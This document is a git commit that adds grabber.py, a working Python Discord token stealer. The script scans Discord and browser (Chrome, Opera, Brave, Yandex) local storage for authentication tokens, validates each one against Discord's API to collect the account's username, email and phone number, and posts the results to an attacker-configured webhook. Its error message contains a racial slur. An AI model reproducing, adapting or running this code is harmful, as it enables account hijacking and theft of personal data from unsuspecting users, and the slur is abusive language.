8340aca39cc955da88b1cbd221a76ec81fab6d8c
quiet69 <43907678+quiet69@users.noreply.github.com>
2021-02-03 00:18:26 +0530

    Add files via upload

---
+++ grabber.py
@@ -0,0 +1,92 @@
+import os
+import re
+import json
+
+from urllib.request import Request, urlopen
+
+import requests
+
+WEBHOOK_URL = ""
+PING_ME = None
+with open('./config.json') as file:
+  data = json.load(file)
+  WEBHOOK_URL =data['webhook']
+  PING_ME = data['ping']
+print(WEBHOOK_URL)
+print(type(PING_ME))
+
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                try:
+                    headers = {
+                        'authorization': token,
+                        'Content-Type': 'application/json'
+                    }
+                    res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+                    res = res.json()
+                    if res['id']:
+                        message += f"```{token}: {res['username']}#{res['discriminator']} - ({res['id']}) - {res['email']} - {res['phone']}\n```"
+                except:
+                    pass
+        else:
+            message += 'No tokens found.\n'
+        headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+        }
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        print('nigga something went wrong')
+    
+    
+
+
+if __name__ == '__main__':
+    main()
